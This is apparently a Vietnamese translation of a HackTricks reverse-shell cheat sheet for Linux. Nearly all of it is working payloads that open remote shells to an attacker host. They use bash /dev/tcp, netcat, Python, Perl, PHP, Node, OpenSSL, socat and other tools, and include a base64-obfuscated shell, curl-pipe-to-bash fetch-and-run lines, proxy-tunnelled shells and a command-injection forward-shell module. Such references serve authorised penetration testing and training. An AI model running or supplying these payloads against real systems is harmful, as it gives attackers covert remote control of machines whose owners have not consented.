# Shells - Linux

{{#include ../../banners/hacktricks-training.md}}

**Nếu có câu hỏi về bất kỳ shell nào trong số này, bạn có thể kiểm tra bằng** [**https://explainshell.com/**](https://explainshell.com/).<sup>[[9]](#references)</sup>

## Full TTY

**Sau khi có reverse shell**[ **hãy đọc trang này để có Full TTY**](full-ttys.md)**.**

Các payload reverse shell cơ bản được liệt kê bên dưới cũng được ghi lại trong cheat sheet của HighOn.Coffee và PayloadsAllTheThings; hãy kiểm tra xem interpreter và tiện ích có sẵn trên mục tiêu hay không trước khi chọn payload.<sup>[[1]](#references)[[4]](#references)</sup>

## Bash | sh

```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```

Đừng quên kiểm tra với các shell khác: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh và bash.

### Shell an toàn với ký hiệu

```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```

#### Giải thích về shell

Các điểm sau đây tóm tắt hành vi tương tác và chuyển hướng đã được tài liệu hóa của Bash:<sup>[[10]](#references)[[11]](#references)</sup>

1. **`bash -i`**: Phần này của lệnh khởi chạy một shell Bash tương tác (`-i`).
2. **`>&`**: Phần này của lệnh là ký hiệu viết tắt để **chuyển hướng cả đầu ra tiêu chuẩn** (`stdout`) và **lỗi tiêu chuẩn** (`stderr`) đến **cùng một đích**.
3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Đây là một tệp đặc biệt **đại diện cho kết nối TCP đến địa chỉ IP và cổng được chỉ định**.
   - Bằng cách **chuyển hướng các luồng đầu ra và lỗi đến tệp này**, lệnh sẽ gửi đầu ra của phiên shell tương tác đến máy của kẻ tấn công.
4. **`0>&1`**: Phần này của lệnh **chuyển hướng đầu vào tiêu chuẩn (`stdin`) đến cùng đích với đầu ra tiêu chuẩn (`stdout`)**.

### Tạo trong tệp và thực thi

```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```

## Forward Shell

Khi có RCE nhưng reverse shell bị firewall, NAT hoặc bộ lọc outbound chặn, forward shell qua kênh RCE có thể cung cấp một phiên tương tác bán phần.<sup>[[12]](#references)</sup>

Một công cụ được khuyên dùng cho mục đích này là [toboggan](https://github.com/n3rada/toboggan.git), công cụ này bao bọc một primitive thực thi lệnh trong một phiên tương tác.<sup>[[12]](#references)</sup>

Để sử dụng toboggan, hãy tạo một Python module phù hợp với ngữ cảnh RCE của hệ thống mục tiêu; interface của module yêu cầu một hàm `execute(command, timeout)` trả về đầu ra của lệnh.<sup>[[12]](#references)</sup> Ví dụ, một module có tên `nix.py` có thể được cấu trúc như sau:

```python3
import jwt
import httpx

def execute(command: str, timeout: float = None) -> str:
    # Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
    token = jwt.encode(
        {"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
    )

    response = httpx.get(
        url="https://vulnerable.io:3200",
        headers={"Authorization": f"Bearer {token}"},
        timeout=timeout,
        # ||BURP||
        verify=False,
    )

    # Check if the request was successful
    response.raise_for_status()

    return response.text
```

Chạy module bằng cú pháp dòng lệnh hiện tại của toboggan:<sup>[[12]](#references)</sup>

```shell
toboggan nix.py
```

Điều này bắt đầu phiên tương tác. Với backend tích hợp sẵn của Burp Suite, dùng `toboggan --request burp_request.xml`; với backend command-wrapper, dùng `toboggan --exec-wrapper '<command_template>'`.<sup>[[12]](#references)</sup>

Một lựa chọn khác là implementation forward-shell của `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).<sup>[[13]](#references)</sup>

Bạn cần chỉnh sửa các phần sau:<sup>[[13]](#references)</sup>

- URL của host dễ bị tấn công
- Prefix và suffix của payload (nếu có)
- Cách gửi payload (headers? data? thông tin bổ sung?)

Sau đó, bạn có thể **gửi lệnh** hoặc dùng **lệnh `upgrade`** để có một PTY đầy đủ; implementation kiểm tra output theo khoảng thời gian xấp xỉ 1,3 giây.<sup>[[13]](#references)</sup>

## Netcat

```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```

## BusyBox

BusyBox gộp nhiều tiện ích vào một tệp thực thi nhỏ và thường có trên các hệ thống Linux nhỏ hoặc nhúng. Nếu không có `nc` độc lập, hãy kiểm tra xem BusyBox có cung cấp tiện ích này không:<sup>[[8]](#references)[[19]](#references)</sup>

```bash
busybox --list-full | grep -E '(^|/)nc$'
busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
busybox nc <ATTACKER-IP> <PORT> -e sh
```

Nếu có `busybox nc` nhưng việc thực thi tương tác không ổn định, hãy điều chỉnh mẫu FIFO từ phần `nc` cho applet này:<sup>[[2]](#references)[[8]](#references)</sup>

```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
```

## gsocket

Xem hướng dẫn triển khai chính thức tại [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/).<sup>[[14]](#references)</sup>

```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```

## Telnet

```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```

## Whois

**Kẻ tấn công**

```bash
while true; do nc -l <port>; done
```

Sử dụng cùng chuỗi đầu vào Enter/CTRL+D được mô tả trong phần Whois.<sup>[[3]](#references)</sup>

**Nạn nhân**

```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```

## Python

```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```

## Perl

```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## PHP

```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```

## Java

```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Ncat

```bash
victim> ncat <ip> <port,eg.443> --ssl  -c  "bash -i 2>&1"
attacker> ncat -l <port,eg.443> --ssl
```

### Thông qua proxy outbound được chỉ định rõ

Nếu target có thể truy cập proxy HTTP `CONNECT` hoặc SOCKS nhưng không thể mở kết nối TCP trực tiếp đến listener, hãy dùng **Ncat** ở chế độ connect. Proxy phải cho phép tunnel đến host và port của listener; `CONNECT` chỉ chuyển tiếp byte sau khi thiết lập, vì vậy shell thuần **không** phải là lưu lượng HTTP và cũng không được mã hóa chỉ vì sử dụng proxy HTTP.<sup>[[20]](#references)[[21]](#references)[[22]](#references)</sup>

```bash
# Attacker: expose a listener reachable from the proxy
ncat -l 443

# Target: HTTP CONNECT proxy (default proxy type)
ncat --proxy <PROXY_HOST>:<PROXY_PORT> --proxy-type http --exec "/bin/sh -i" <ATTACKER_HOST> 443

# Target: use this instead for a SOCKS5 proxy
ncat --proxy <PROXY_HOST>:<PROXY_PORT> --proxy-type socks5 --exec "/bin/sh -i" <ATTACKER_HOST> 443
```

Đối với proxy đã xác thực, Ncat chấp nhận `--proxy-auth` hoặc `NCAT_PROXY_AUTH` (cách thứ hai tránh đưa thông tin xác thực vào các đối số lệnh).<sup>[[23]](#references)</sup> Theo mặc định, proxy phân giải tên máy chủ đích; chỉ dùng `--proxy-dns local` khi cần phân giải cục bộ.<sup>[[23]](#references)</sup> Nếu proxy yêu cầu TLS hoặc các giao thức ứng dụng ngoài `CONNECT`, hãy dùng phương thức truyền tải được mã hóa phù hợp thay vì cho rằng cổng 443 có thể ngụy trang một raw shell; xem [tunneling and port forwarding](../tunneling-and-port-forwarding.md) để biết phương thức truyền tải dựa trên WebSocket.<sup>[[22]](#references)[[24]](#references)</sup>

## Golang

```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

## Lua

```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

## NodeJS

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "10.17.26.64", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```

## Zsh (TCP tích hợp sẵn)

```bash
# Requires no external binaries; leverages zsh/net/tcp module
zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
```

## Rustcat (rcat)

[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – listener hiện đại kiểu netcat được viết bằng Rust.<sup>[[5]](#references)</sup>

```bash
# Attacker – interactive listener with history & tab-completion
rcat listen -ib 55600

# Victim – download a Linux release binary and connect back with /bin/bash
curl -L https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-linux-x86_64 -o /tmp/rcat \
  && chmod +x /tmp/rcat \
  && /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
```

Các tính năng được dự án ghi lại gồm:<sup>[[5]](#references)</sup>
- Lịch sử lệnh và tự động hoàn thành bằng phím Tab ở chế độ tương tác
- `-s` để chọn shell executable mà `connect` sử dụng

## pwncat-cs

Nếu bạn đã có **bất kỳ raw reverse shell nào** nhưng muốn một listener có thể thiết lập phiên dễ sử dụng hơn, `pwncat-cs` có thể xử lý kết nối và thử tạo PTY từ xa.<sup>[[7]](#references)</sup>

```bash
# Attacker - catch a plain reverse shell and auto-upgrade it when possible
python3 -m pip install --user pwncat-cs
pwncat-cs -lp 4444

# Victim - reuse any payload from this page
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
```

Nó cũng hỗ trợ các kênh `ssl-bind` và `ssl-connect` **được mã hóa**, nên bạn có thể kết hợp với payload `ncat --ssl` hoặc `socat OPENSSL:` khi cần mã hóa lưu lượng truyền tải.<sup>[[7]](#references)</sup>

## revsh (được mã hóa và sẵn sàng pivot)

`revsh` là một client/server C nhỏ gọn, cung cấp TTY đầy đủ qua **đường hầm Diffie-Hellman được mã hóa** và có thể tùy chọn gắn giao diện **TUN/TAP** để pivoting ngược kiểu VPN.<sup>[[6]](#references)</sup>

```bash
# Build after preparing the OpenSSL dependency as described in the repository README
git clone https://github.com/emptymonkey/revsh && cd revsh && make

# Attacker – controller/listener on 443
revsh -c 0.0.0.0:443

# Victim – reverse shell over the encrypted tunnel
./revsh <ATTACKER-IP>:443
```

Các flag hữu ích được tài liệu `revsh` ghi lại gồm:<sup>[[6]](#references)</sup>
- `-b`: chế độ bind-shell (bật ở cả hai đầu)
- `-D [LHOST:]LPORT` hoặc `-B [RHOST:]RPORT`: chuyển tiếp SOCKS 4/4a/5 động
- `-x`: tắt tự động thiết lập proxy, bao gồm thiết lập TUN/TAP mặc định

Tunnel được mã hóa giúp tránh để lộ lưu lượng shell dưới dạng plaintext, nhưng bản thân nó không vượt qua chính sách mạng.<sup>[[6]](#references)</sup>

## OpenSSL

Phần này sử dụng các lệnh `req`, `s_server` và `s_client` của OpenSSL để tạo certificate và truyền shell qua TLS.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

Kẻ tấn công (Kali)

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port>
```

Nạn nhân

```bash
#Linux - one-port TLS shell using a named pipe
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s

#If the target needs SNI / hostname validation to blend with a fronted TLS service
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
```

Bạn vẫn có thể sử dụng mẫu **two-listener** cổ điển khi muốn tách riêng các kênh đầu vào/đầu ra.<sup>[[16]](#references)[[17]](#references)</sup>

```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

## Awk

```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

## Finger

**Kẻ tấn công**

```bash
while true; do nc -l 79; done
```

Để gửi lệnh, hãy nhập lệnh, nhấn Enter rồi nhấn CTRL+D (để dừng STDIN).<sup>[[3]](#references)</sup>

**Nạn nhân**

```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```

## Gawk

```bash
#!/usr/bin/gawk -f

BEGIN {
        Port    =       8080
        Prompt  =       "bkd> "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |& Service
                        Service |& getline cmd
                        if (cmd) {
                                while ((cmd |& getline) > 0)
                                        print $0 |& Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}
```

## Xterm

Thao tác này sẽ thử kết nối đến hệ thống của bạn qua cổng 6001.<sup>[[2]](#references)</sup>

```bash
xterm -display 10.0.0.1:1
```

Để bắt reverse shell, hãy sử dụng X server đang lắng nghe trên cổng 6001 như minh họa bên dưới.<sup>[[2]](#references)</sup>

```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```

## Groovy

bởi [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76). LƯU Ý: Java reverse shell cũng hoạt động với Groovy.<sup>[[18]](#references)</sup>

```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## References

- [1] [Bảng tổng hợp Reverse Shell: PHP, ASP, Netcat, Bash & Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [2] [Bảng tổng hợp Reverse Shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [3] [Sử dụng Whois và Finger cho Reverse Shell](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
- [4] [PayloadsAllTheThings - Bảng tổng hợp Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [5] [rustcat - Trình lắng nghe port hiện đại và reverse shell](https://github.com/robiot/rustcat)
- [6] [revsh - Reverse shell hỗ trợ terminal, tunneling dữ liệu và khả năng pivoting nâng cao](https://github.com/emptymonkey/revsh)
- [7] [pwncat (pwncat-cs) - nền tảng post-exploitation](https://github.com/calebstewart/pwncat)
- [8] [busybox | GTFOBins](https://gtfobins.org/gtfobins/busybox/)
- [9] [explainshell.com](https://explainshell.com/)
- [10] [Sổ tay tham khảo Bash: Chuyển hướng](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
- [11] [Sổ tay tham khảo Bash: Gọi Bash](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
- [12] [toboggan](https://github.com/n3rada/toboggan)
- [13] [forward-shell](https://github.com/IppSec/forward-shell)
- [14] [Hướng dẫn triển khai Global Socket](https://www.gsocket.io/deploy/)
- [15] [openssl-req](https://docs.openssl.org/4.0/man1/openssl-req/)
- [16] [openssl-s_server](https://docs.openssl.org/master/man1/openssl-s_server/)
- [17] [openssl-s_client](https://docs.openssl.org/master/man1/openssl-s_client/)
- [18] [Reverse Shell thuần Groovy/Java](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
- [19] [BusyBox](https://busybox.net/about.html)
- [20] [Proxying với Ncat](https://nmap.org/ncat/guide/ncat-proxy.html)
- [21] [Thực thi lệnh với Ncat](https://nmap.org/ncat/guide/ncat-exec.html)
- [22] [RFC 9110: CONNECT](https://www.rfc-editor.org/rfc/rfc9110.html#section-9.3.6)
- [23] [Hướng dẫn tham khảo Ncat](https://nmap.org/book/ncat-man.html)
- [24] [README của wstunnel](https://github.com/erebe/wstunnel/blob/main/README.md)
{{#include ../../banners/hacktricks-training.md}}
